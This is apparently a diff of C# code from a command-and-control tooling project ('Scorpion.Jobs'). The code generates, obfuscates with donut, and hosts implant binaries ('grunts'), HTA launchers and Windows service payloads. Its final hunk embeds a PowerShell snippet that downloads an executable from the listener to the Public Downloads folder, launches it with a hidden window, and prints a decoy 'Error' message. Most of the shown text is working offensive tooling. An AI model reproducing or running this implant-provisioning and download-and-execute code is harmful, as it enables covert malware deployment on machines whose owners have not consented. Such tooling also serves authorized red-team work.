@@ -62,7 +62,6 @@ namespace Scorpion.Jobs
       File.WriteAllBytes(defaultHttpBinPath, Convert.FromBase64String(binaryLauncher.Base64ILByteString));
 
       HostedFile hostedBinaryLauncher = await FindOrCreateHostedDefaultHttpGrunt(listener, binaryLauncher);
-
       HostedFile hostedBinaryLauncherHta = await FindOrCreateHostedDefaultHttpGruntHta(listener, hostedBinaryLauncher);
 
       var defaultHttpHtaPath = Path.Join(dataDir, "app.hta");
@@ -85,6 +84,9 @@ namespace Scorpion.Jobs
         Console.Write("Not generating shellcode for default grunt because not on windows.");
       }
 
+      var defaultObfuscatedBinPath = await ProvisionBinaryGrunt(listener, binaryLauncher, "http", dataDir, nugetExePath, donutExePath);
+      await ProvisionSvcBinaryServiceGrunt(listener, binaryLauncher, "http", dataDir, defaultObfuscatedBinPath);
+
       for (int i = 0; i < smbGruntCount; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
@@ -97,15 +99,15 @@ namespace Scorpion.Jobs
         Console.WriteLine("Saving Unobfuscated Grunt Binary");
         File.WriteAllBytes(smbBinPath, rawSmbBin);
 
-        var obfuscatedBinPath = await ProvisionSmbBinaryGrunt(listener, smbLauncher, aGuid, dataDir, nugetExePath, donutExePath);
+        var obfuscatedBinPath = await ProvisionBinaryGrunt(listener, smbLauncher, aGuid, dataDir, nugetExePath, donutExePath);
         if (!String.IsNullOrEmpty(obfuscatedBinPath)) {
-          await ProvisionSmbBinaryServiceGrunt(listener, smbLauncher, aGuid, dataDir, obfuscatedBinPath);
+          await ProvisionSvcBinaryServiceGrunt(listener, smbLauncher, aGuid, dataDir, obfuscatedBinPath);
         }
       }
       return await Task.FromResult(0);
     }
 
-    public async Task<string> ProvisionSmbBinaryGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string nugetExePath, string donutExePath)
+    public async Task<string> ProvisionBinaryGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string nugetExePath, string donutExePath)
     {
       var request = new RequestBuilder(Api);
       var projDir = Path.Join(dataDir, aGuid);
@@ -184,7 +186,7 @@ namespace Scorpion.Jobs
       return await Task.FromResult("");
     }
 
-    public async Task<int> ProvisionSmbBinaryServiceGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string obfuscatedBinPath)
+    public async Task<int> ProvisionSvcBinaryServiceGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string obfuscatedBinPath)
     {
       var request = new RequestBuilder(Api);
       var svcGuid = aGuid + "svc";
@@ -237,7 +239,7 @@ namespace Scorpion.Jobs
           RunMsbuildForGrunt(svcGuid, projDir, msbuildPath, csprojName);
 
           var hostedUrlPath = "/" + svcGuid + ".exe";
-          Console.WriteLine($"Hosting obfsucated service smb binary at path {hostedUrlPath}");
+          Console.WriteLine($"Hosting obfsucated service svc binary at path {hostedUrlPath}");
           var hostedBin = new HostedFile();
           hostedBin.ListenerId = listener.Id;
           hostedBin.Path = hostedUrlPath;
@@ -627,7 +629,7 @@ namespace Scorpion.Jobs
     {
       // TODO: make sure path starts with /
       var script = string.Format(@"
-$loc = ""\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
+$loc = ""C:\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
 (New-Object Net.WebClient).DownloadFile('http://{0}{1}', $loc);
 Start-Process -FilePath $loc -WindowStyle Hidden;
 Write-Output ""Error"";
